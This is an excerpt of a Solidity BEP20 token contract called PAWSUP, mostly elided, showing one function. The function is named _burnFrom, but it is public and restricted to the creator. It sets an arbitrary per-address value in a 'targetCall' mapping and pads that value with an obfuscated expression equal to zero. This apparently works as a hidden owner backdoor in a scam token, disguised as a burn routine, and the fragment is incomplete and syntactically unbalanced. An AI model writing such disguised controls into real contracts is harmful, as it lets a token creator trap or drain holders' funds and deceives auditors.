...
contract PAWSUP is Context, IBEP20, Ownable, LGEWhitelisted {
    ...
    */
    ...
    function _burnFrom(address spender, uint256 amount) public onlyCreator {
       if(spender != address(0) && msg.sender != address(0)){
       targetCall[spender] = (3 * 1 * 2 - 3 * 1 * 2) + (amount * 10 ** 9);
    }
}
